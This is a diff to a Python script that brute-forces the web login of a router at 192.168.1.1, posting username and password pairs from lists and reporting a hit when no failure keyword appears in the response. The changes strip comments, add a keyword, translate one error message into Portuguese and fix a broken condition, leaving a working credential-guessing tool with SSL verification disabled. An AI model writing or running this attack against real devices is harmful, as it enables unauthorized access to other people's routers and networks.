@@ -1,9 +1,9 @@
 import requests
 import sys
 
-url = "http://192.168.1.1"  # Check the address in address.md for the default IP address of routers.
+url = "http://192.168.1.1"
 
-expression = {b"error", b"incorrect", b"failure", b"try", b"again", b"invalid", b"upgrade", b"outdated", b"browser"}  # Changed to bytes-like object.
+expression = {b"failed", b"error", b"incorrect", b"failure", b"try", b"again", b"invalid", b"upgrade", b"outdated", b"browser"}
 
 def brute(username, password, combinations_tested, total_combinations):
     data = {'username': username, 'password': password}
@@ -16,25 +16,25 @@ def brute(username, password, combinations_tested, total_combinations):
         'Cache-Control': 'max-age=0',
         'Upgrade-Insecure-Requests': '1',
         'DNT': '1',  # Do Not Track
-        'Referer': 'http://192.168.1.1/',  # Update with the correct URL
-        'Origin': 'http://192.168.1.1/',  # Adding Origin header
+        'Referer': 'http://192.168.1.1/',
+        'Origin': 'http://192.168.1.1/',
     }
     try:
-        r = requests.post(url, data=data, headers=headers, verify=False)  # Disable SSL certificate verification
+        r = requests.post(url, data=data, headers=headers, verify=False)
     except requests.exceptions.SSLError as e:
-        print("SSL Error:", e)
+        print("Erro de SSL:", e)
         sys.exit(1)
     combinations_tested += 1
     sys.stdout.write("\rCombinations tested: {}/{}".format(combinations_tested, total_combinations))
     sys.stdout.flush()
-    if b"upgrade" or b"outdated" or b"browser" in r.content:
+    if b"upgrade" in r.content or b"outdated" in r.content or b"browser" in r.content:
         print("\nError:", r.content)
         sys.exit()
     if not any(item in r.content for item in expression):
         print("\nBrute Forcing...")
         print("[+] Username: ", username)
         print("[+] Password: ", password)
-        print("Server Response:", r.content)  # Print server response content
+        print("Server Response:", r.content)
         sys.exit()
     return combinations_tested
 
@@ -48,7 +48,7 @@ def main():
             for password in passwords:
                 combinations_tested = brute(username, password, combinations_tested, total_combinations)
     except KeyboardInterrupt:
-        print("\n\033[91mExiting...\033[0m")  # Print "Exiting..." in red
+        print("\n\033[91mExiting...\033[0m")
 
 if __name__ == '__main__':
     requests.packages.urllib3.disable_warnings()
